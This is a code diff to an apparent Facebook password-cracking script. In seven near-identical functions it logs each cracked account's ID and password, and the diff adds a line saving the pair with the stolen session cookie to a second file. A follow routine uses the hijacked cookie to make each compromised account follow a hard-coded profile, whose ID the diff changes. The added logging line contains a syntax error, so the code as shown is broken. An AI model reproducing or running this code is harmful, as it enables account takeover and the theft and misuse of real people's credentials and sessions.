@@ -423,7 +423,8 @@ def monkk(idf,pwv):
 				print(f'\r\x1b[1;92m [ EXCELLENT ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -464,7 +465,8 @@ def tuekk(idf,pwv):
 				print(f'\r\x1b[1;92m [ EXCELLENT ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -505,7 +507,8 @@ def wedkk(idf,pwv):
 				print(f'\r\x1b[1;92m [ EXCELLENT ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -546,7 +549,8 @@ def thurskk(idf,pwv):
 				print(f'\r\x1b[1;92m [ EXCELLENT ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -587,7 +591,8 @@ def frikk(idf,pwv):
 				print(f'\r\x1b[1;92m [ EXCELLENT ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -628,7 +633,8 @@ def satkk(idf,pwv):
 				print(f'\r\x1b[1;92m [ EXCELLENT ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -669,7 +675,8 @@ def sunkk(idf,pwv):
 				print(f'\r\x1b[1;92m [ EXCELLENT ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/ultron-ok.txt', 'a').write(idf+' | '+pw+'\n')
+				open('/storage/emulated/0/rahul-cookie.txt', 'a').write(idf+' | '+pw+ ' | ' coki+'\n')
 				follow(ses,coki)
 				break
 
@@ -682,7 +689,7 @@ def sunkk(idf,pwv):
 	
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100010716788513', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
